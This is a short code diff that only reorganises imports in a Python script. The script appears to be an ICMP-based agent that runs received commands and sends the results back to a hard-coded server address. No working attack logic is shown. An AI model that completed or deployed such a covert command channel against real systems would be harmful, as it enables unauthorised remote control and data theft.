@@ -1,6 +1,11 @@
-from scapy.all import *
 import time
 import socket
+import subprocess
+
+from scapy.layers.inet import IP, ICMP
+from scapy.packet import Raw
+from scapy.sendrecv import send, AsyncSniffer
+
 
 SERVER_IP = "192.168.10.50"
 
@@ -34,7 +39,6 @@ def handle_incoming(pkt):
 
 def run_task(cmd):
     # Execute and send back results
-    import subprocess
     MAX_PAYLOAD = 1460
     PREFIX = b"RESULT|"
 
